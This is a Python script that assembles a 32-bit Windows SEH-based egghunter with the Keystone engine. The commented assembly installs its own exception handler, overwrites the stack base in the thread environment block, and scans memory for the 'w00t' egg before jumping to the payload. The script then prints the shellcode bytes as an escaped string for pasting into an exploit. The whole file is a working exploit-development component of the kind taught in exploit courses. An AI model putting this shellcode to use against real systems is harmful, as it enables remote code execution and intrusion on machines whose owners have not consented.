from keystone import *
CODE = (
" start: "
 # jump to a negative call to dynamically 
 # obtain egghunter position
" jmp get_seh_address ;" 
" build_exception_record: "
 # pop the address of the exception_handler 
 # into ecx
" pop ecx ;" 
 # mov signature into eax
" mov eax, 0x74303077 ;" 
 # push Handler of the 
 # _EXCEPTION_REGISTRATION_RECORD structure
" push ecx ;" 
 # push Next of the 
 # _EXCEPTION_REGISTRATION_RECORD structure
" push 0xffffffff ;" 
 # null out ebx
" xor ebx, ebx ;" 
 # overwrite ExceptionList in the TEB with a pointer
 # to our new _EXCEPTION_REGISTRATION_RECORD structure
" mov dword ptr fs:[ebx], esp ;" 
# Overwrite stackbase with address lower then our handler
" sub ecx , 0x06 ;"
" add ebx , 0x04 ;"
" mov dword ptr fs:[ebx] , ecx ;"
" is_egg: "
 # push 0x02
" push 0x02 ;" 
 # pop the value into ecx which will act 
 # as a counter
" pop ecx ;" 
 # mov memory address into edi
" mov edi, ebx ;" 
 # check for our signature, if the page is invalid we 
 # trigger an exception and jump to our exception_handler function
" repe scasd ;" 
 # if we didn't find signature, increase ebx 
 # and repeat
" jnz loop_inc_one ;" 
 # we found our signature and will jump to it
" jmp edi ;" 
" loop_inc_page: " 
 # if page is invalid the exception_handler will 
 # update eip to point here and we move to next page
" or bx, 0xfff ;" 
" loop_inc_one: "
 # increase ebx by one byte
" inc ebx ;" 
 # check for signature again
" jmp is_egg ;" 
" get_seh_address: "
 # call to a higher address to avoid null bytes & push 
 # return to obtain egghunter position
" call build_exception_record ;" 
 # push 0x0c onto the stack
" push 0x0c ;" 
 # pop the value into ecx
" pop ecx ;" 
 # mov into eax the pointer to the CONTEXT 
 # structure for our exception
" mov eax, [esp+ecx] ;" 
 # mov 0xb8 into ecx which will act as an 
 # offset to the eip
" mov cl, 0xb8 ;" 
 # increase the value of eip by 0x06 in our CONTEXT 
 # so it points to the "or bx, 0xfff" instruction 
 # to increase the memory page
" add dword ptr ds:[eax+ecx], 0x06 ;" 
 # save return value into eax
" pop eax ;" 
 # increase esp to clean the stack for our call
" add esp, 0x10 ;" 
 # push return value back into the stack
" push eax ;" 
 # null out eax to simulate 
 # ExceptionContinueExecution return
" xor eax, eax ;" 
 # return
" ret ;" 
)
# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)

encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
egghunter = ""
for dec in encoding: 
 egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n") 
print("egghunter = (\"" + egghunter + "\")")
